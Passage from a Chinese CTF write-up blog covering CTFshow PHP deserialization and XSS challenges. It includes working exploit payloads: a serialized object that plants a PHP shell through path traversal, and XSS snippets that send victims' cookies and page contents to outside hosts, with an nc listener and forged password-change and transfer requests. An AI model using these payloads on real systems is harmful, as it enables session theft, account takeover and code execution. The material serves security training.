operator">=</span><span class="token operator">></span> <span class="token string">'web'</span><span class="token punctuation">,</span>    <span class="token string">'server'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>    <span class="token string">'username'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'root'</span><span class="token punctuation">,</span>    <span class="token string">'password'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'root'</span><span class="token punctuation">,</span>    <span class="token string">'charset'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'utf8'</span><span class="token punctuation">,</span>    <span class="token string">'port'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">3306</span><span class="token punctuation">,</span>    <span class="token string">'prefix'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>    <span class="token string">'option'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>        <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ATTR_CASE</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">CASE_NATURAL</span>    <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// sql注入检查</span><span class="token keyword">function</span> <span class="token function">checkForm</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\（|\）|\+|\=|\[|\]|\;|\:|\'|\"|\&lt;|\,|\>|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$status</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">status</span><span class="token operator">=</span><span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"log-"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token string">"使用"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">.</span><span class="token string">"登陆"</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">status</span><span class="token operator">?</span><span class="token string">"成功"</span><span class="token punctuation">:</span><span class="token string">"失败"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"----"</span><span class="token punctuation">.</span><span class="token function">date_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">'Y-m-d H:i:s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$this-&gt;username，$this-&gt;password</code>均为我们可控，所以存在漏洞</p><p><a href="https://blog.csdn.net/solitudi/article/details/107750063?ops_request_misc=%7B%22request%5Fid%22%3A%22160775411819724848183660%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=160775411819724848183660&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-2-107750063.pc_v2_rank_blog_default&utm_term=session&spm=1018.2118.3001.4450" target="_blank" rel="noopener">[代码审计]PHP中session的存储方式(WP)</a></p><p><strong>index.php：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//超过5次禁止登陆</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'limti'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"登陆失败次数超过限制"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>         <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"limit"</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// </span>         <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这也就是一开始的登陆页面</p><p><strong>check.php：</strong>针对cookie中的limit进行次数检测</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string">'inc/inc.php'</span><span class="token punctuation">;</span><span class="token variable">$GET</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"u"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"pass"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$GET</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span><span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span>    <span class="token string">'id'</span><span class="token punctuation">,</span>        <span class="token string">'UserName0'</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>        <span class="token string">"AND"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span>        <span class="token string">"UserName0[=]"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"PassWord1[=]"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">//密码必须为128位大小写字母+数字+特殊符号，防止爆破</span>        <span class="token punctuation">]</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//登陆成功取消次数累计</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"欢迎您"</span><span class="token punctuation">.</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'UserName0'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//登陆失败累计次数加1</span>        <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"登陆失败"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>session.serialize_handler( 5.5.4前默认是php；5.5.4后改为php_serialize)存在以下几种：</p><ul><li>php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</li><li>php 键名+竖线（|）+经过serialize()函数处理过的值</li><li>php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化</li></ul><p>因为此php版本为7.3.11，并且设置为php处理器而不是php_serialize处理器，所以存在session反序列漏洞</p><p><a href="https://www.jb51.net/article/116246.htm" target="_blank" rel="noopener">深入浅析PHP的session反序列化漏洞问题</a>看完就明白了</p><p>在 php_serialize 引擎下，session文件中存储的数据为:</p><pre class="line-numbers language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"spoock"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>php 引擎下文件内容为:</p><pre class="line-numbers language-php"><code class="language-php">name<span class="token operator">|</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"spoock"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>暂时用到的是这两个</p><p>exp：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">"admin/../../../../../../../../../../var/www/html/1.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">"&lt;?php system('cat flag.php');?>"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$status</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span>  <span class="token string">"|"</span><span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解题步骤：<br>1.首先访问首页，获得 cookie，同时建立 session<br>2.通过cookie manager将cookie中的limit修改为序列化字符串<br>3.访问 check.php，反序列化实现 shell 写入<br>4.访问1.php审查元素查看flag</p><h1 id="web264——反序列化字符串逃逸"><a href="#web264——反序列化字符串逃逸" class="headerlink" title="web264——反序列化字符串逃逸"></a>web264——反序列化字符串逃逸</h1><p><strong>payload：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>f<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>m<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>t<span class="token operator">=</span>3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="token string">";s:5:"</span>token<span class="token string">";s:5:"</span>admin"<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token operator">==</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问message.php时需要设置session，在cookie中添加msg，value任意</p><h1 id="web265——反序列化中指针引用：-amp"><a href="#web265——反序列化中指针引用：-amp" class="headerlink" title="web265——反序列化中指针引用：&amp;"></a>web265——反序列化中指针引用：&amp;</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfshowAdmin</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token operator">===</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctfshow</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// </span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>引用：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string">'123'</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//&amp;将a的地址传给b，所以b的值是跟着a的变化而变化</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//运行结果</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payload：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">ctfshowAdmin</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshowAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//运行结果</span>O<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token string">"ctfshowAdmin"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"token"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"password"</span><span class="token punctuation">;</span>R<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow之web(五)</title>
      <link href="/2021/08/06/ctfshow-zhi-web-wu/"/>
      <url>/2021/08/06/ctfshow-zhi-web-wu/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a>XSS平台</h1><pre><code>document.cookie 获取饼干的js代码推荐xss平台：http://xsscom.com/ ， https://xss.pt/</code></pre><p>JavaScript的 <code>document.cookie</code> 将以<code>字符串</code>的方式返回<code>所有</code>的cookie，类型格式： <code>cookie1=value; cookie2=value; cookie3=value;</code></p><h1 id="2021-08-06"><a href="#2021-08-06" class="headerlink" title="2021-08-06"></a>2021-08-06</h1><h1 id="web316-反射型"><a href="#web316-反射型" class="headerlink" title="web316(反射型)"></a>web316(反射型)</h1><p>利用xss平台里的代码进行攻击： <code>http://xsscom.com/</code></p><p>建造完项目以后，复制代码：</p><p><code>&lt;script src=http://xsscom.com//Y9GOjn&gt;</code></p><p>利用的就是让点击的人的去触发恶意的连接，这里利用的是一个图片标签，原理就是然客户端去请求这个网站，顺带着也就吧cookie给带出来了</p><h1 id="web317、318、319"><a href="#web317、318、319" class="headerlink" title="web317、318、319"></a>web317、318、319</h1><p>317过滤了script<br>318过滤了img</p><p>换一个代码标签将继续插</p><h1 id="web320、321、322——过滤空格"><a href="#web320、321、322——过滤空格" class="headerlink" title="web320、321、322——过滤空格"></a>web320、321、322——过滤空格</h1><p>可用tab绕过，或者/代替</p><h1 id="web323、324、325、326"><a href="#web323、324、325、326" class="headerlink" title="web323、324、325、326"></a>web323、324、325、326</h1><p>过滤了iframe<br><code>&lt;body/onload=document.location=&#39;http://ssjsj.ak6666.top:20002/?cookie=&#39;+document.cookie;&gt;</code><br>输入后服务器开启监 nc -lvp 20002（bot会每隔一段时间访问输入的内容）<br>看监听到的内容会有flag</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210806205040780.png" alt></p><h1 id="web327-储存型xss"><a href="#web327-储存型xss" class="headerlink" title="web327(储存型xss)"></a>web327(储存型xss)</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210806210549858.png" alt></p><h1 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h1><p>再注册的地方xss进去会抓到admin的cookie，然后点击用户管理会出现api被调用，将所有抓到的包都修改cookie后可以越权成功！</p><p><strong>payload：</strong></p><p><code>&lt;script&gt;window.open(&#39;http://ssjsj.ak6666.top:20003/&#39;+document.cookie)&lt;/script&gt;</code></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210807131443722.png" alt="image-20210807131443722"></p><h1 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h1><p><strong>强于web328原因</strong>：cookie在被拦截到的时候已经是失效的了，所以盗用cookie将是不可行的方法</p><p><strong>payload</strong></p><p><code>&lt;script&gt;window.open(&#39;http://ssjsj.ak6666.top:20003/&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML)&lt;/script&gt;</code></p><p>通过document.getElementsByClassName(‘layui-table-cell laytable-cell-1-0-1’)[1].innerHTML获取到指定的内容，</p><pre class="line-numbers language-python"><code class="language-python">getElementsByClassName：获取所有指定类名的元素还有innerHTML和outerHTML的区别<span class="token number">1</span>）innerHTML<span class="token punctuation">:</span>　　从对象的起始位置到终止位置的全部内容<span class="token punctuation">,</span>不包括Html标签。<span class="token number">2</span>）outerHTML<span class="token punctuation">:</span>　　除了包含innerHTML的全部内容外<span class="token punctuation">,</span> 还包含对象标签本身。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210807143206412.png" alt></p><p>这样就可以得触发js事件，来得到想要的内容，机器人可能有点懒，不知道我的为什么老是触发不了</p><h1 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h1><p>此题是根据上一题的change.php来猜测出具有改密码功能</p><p>所以利用此功能来实现csrf类似的攻击，payload：</p><p><code>&lt;script&gt;window.open(&quot;http://127.0.0.1/api/change.php?p=a&quot;)&lt;/script&gt;</code></p><p>非预期：获取页面源码，用document.querySelector获取，获取的类是div.layui-container，</p><blockquote><p>获取文档中 id=“demo” 的元素：<br><code>document.querySelector(&quot;#demo&quot;);</code></p></blockquote><p><code>&lt;script&gt;window.open(&#39;http://domain+port/&#39;+document.querySelector(&#39;#top &gt; div.layui-container&#39;).textContent)&lt;/script&gt;</code></p><h1 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h1><p>修改密码功能为post传参修改</p><p><code>&lt;script&gt;$.post(&quot;http://api/change.php&quot;,{p:123123},&quot;json&quot;);&lt;/script&gt;</code></p><h1 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h1><p>其一存在逻辑漏洞，需要你的密码一定要大于6位数，不然转账是不会成功的，利用负负得正的原理，这样转账-99999再转账-999999999就是正整数了</p><h1 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h1><p>利用admin账户给自己转账：</p><p><code>&lt;script&gt;$.post(&quot;http://127.0.0.1/api/amount.php&quot;,{&#39;u&#39;:&#39;ad&#39; 